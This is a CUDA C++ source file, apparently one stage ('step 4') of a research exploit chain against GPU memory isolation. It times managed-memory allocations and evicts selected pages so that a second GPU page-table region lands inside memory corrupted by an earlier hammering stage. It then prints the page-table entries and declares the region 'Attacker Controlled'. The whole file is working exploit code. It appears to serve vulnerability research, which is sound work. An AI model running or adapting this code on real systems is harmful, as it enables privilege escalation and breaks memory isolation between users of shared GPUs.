#include "s3_firstRegion_hammer.cuh"
#include "s4_secondRegion.cuh"
#include <chrono>
#include <thread>
#include <fstream>

bool
second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
                  double threshold, uint64_t skip, GPUBreachContext &ctx)
{
  uint8_t *temp;
  if (!first_PT_region_attack (num_alloc_init, num_alloc_post_msg, threshold,
                               skip, ctx))
    {
      printf ("Error: First PTC Allocation is wrong\n");
      exit (1);
    }

  auto& region_ptrs = ctx.step3_data.region_ptrs;
  auto& agg_ptrs = ctx.step3_data.agg_ptrs;
  auto& corrupted_ptr = ctx.step3_data.corrupted_ptr;
  auto& corrupted_id = ctx.step3_data.corrupted_id;
  auto& victim_id = ctx.step3_data.victim_id;
  ctx.step4_data.corrupted_ptr = corrupted_ptr;

  uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
  uint64_t next_id = ERR_next_id;
  std::vector<uint8_t *> misc_ptrs;
  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      // Create free space for Page Table Region
      if (i == next_id)
        evict_from_device (region_ptrs[victim_id], ALLOC_SIZE);

      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      DBG_OUT << i << " New PT time: " << currentMS << " ms"<< std::endl;

      misc_ptrs.push_back(temp);

      if (i < skip || i % 511 == 0)
        continue;

      if (i == next_id)
        break;
      if (currentMS > threshold && next_id == ERR_next_id)
        next_id = i + 508;
    }

  std::vector<uint8_t*> fourkb_pages;
  for (uint64_t i = 0; i < (((uint64_t)corrupted_ptr % (2L * 1024 * 1024)) / 4096) + 1; i += 1)
  // for (uint64_t i = 0; i < 512 + 1; i += 1)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      fourkb_pages.push_back(temp);
    }
  for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
  {
    if (i != corrupted_id)
      cudaFree(region_ptrs[i]);
    gpuErrchk(cudaPeekAtLastError());
  }
  for (uint64_t i = 0; i < misc_ptrs.size(); i += 1)
  {
    cudaFree(misc_ptrs[i]);
    gpuErrchk(cudaPeekAtLastError());
  }

  auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
  cudaMalloced_ptrs.resize(500);
  for (uint64_t i = 0; i < 500; i += 1)
    {
      cudaMalloc(&cudaMalloced_ptrs[i], ALLOC_SIZE);
      memset_ptr<<<1,1>>>(cudaMalloced_ptrs[i], (uint64_t)cudaMalloced_ptrs[i], 8);
    }
  cudaDeviceSynchronize();
  for (auto& ptr : fourkb_pages)
    cudaFree(ptr);
  for (auto ptr : agg_ptrs)
    cudaFree(ptr);

  print_memory<<<1,1>>>(corrupted_ptr, 64 * 1024);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  std::cout << "(Step 4 Success) Second PT Region Now in Attacker Controlled "
               "Region. We printed out the PTEs of the controlled page and provided "
               "relevant pointers to interact with them in struct S4_ExploitComplete.\n"
               "Those looking like '1 0 76 3 0 0 0 6' are 2MB cudaMalloc PTEs, while '1 55 b4 59 0 0 0 6' "
               "means they are the 4KB PTEs.\n"
               "Press \033[1;32mEnter Key\033[0m to continue..."
            << '\n';
  paused();
  return 0;
}

GPUBreachContext
second_PT_region (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
  const double threshold = std::stod (argv[2]);
  const uint64_t skip = std::stoull (argv[3]);
  GPUBreachContext ctx;

  second_PT_region (num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
  return ctx;
}
